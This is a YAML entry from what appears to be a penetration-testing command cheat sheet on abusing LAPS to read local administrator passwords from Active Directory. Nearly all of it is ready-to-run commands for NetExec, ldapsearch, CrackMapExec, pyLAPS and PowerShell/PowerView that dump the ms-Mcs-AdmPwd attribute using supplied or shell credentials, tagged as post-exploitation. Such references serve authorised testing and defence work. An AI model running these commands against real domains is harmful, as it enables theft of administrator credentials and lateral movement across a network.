---
description: |
  LAPS (Local Administrator Password Solution) abuse — read local administrator passwords stored in Active Directory if permissions allow.
commands:
  - have: Credentials
    cmd: |
      # NetExec — read LAPS passwords
      nxc ldap 10.10.10.27 -u sec_user -p 'P@ssw0rd' -M laps

      # ldapsearch — query ms-Mcs-AdmPwd attribute
      ldapsearch -x -H ldap://10.10.10.27 -D "sec_user@senshu.sh" -w 'P@ssw0rd' -b "DC=senshu,DC=sh" "(ms-Mcs-AdmPwd=*)" ms-Mcs-AdmPwd

      # CrackMapExec — LAPS dump
      crackmapexec ldap 10.10.10.27 -u sec_user -p 'P@ssw0rd' --laps

      # pyLAPS — read LAPS passwords
      python3 pyLAPS.py --action get -d senshu.sh -u sec_user -p 'P@ssw0rd' --dc-ip 10.10.10.27

      # Get-LAPSPasswords PowerShell module
      Import-Module .\Get-LAPSPasswords.ps1
      Get-LAPSPasswords
  - have: Shell
    cmd: |
      # PowerShell — read LAPS from domain-joined host
      Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object {$_.'ms-Mcs-AdmPwd' -ne $null} | Select-Object Name, ms-Mcs-AdmPwd

      # PowerView — enumerate LAPS passwords
      Import-Module .\PowerView.ps1
      Get-DomainComputer -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime
phase:
  - Post-Exploitation
target_os:
  - Windows
services:
  - LDAP
techniques:
  - LAPS_Abuse
references:
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/laps.html
  - https://www.netexec.wiki/
  - https://github.com/p0dalirius/pyLAPS
---
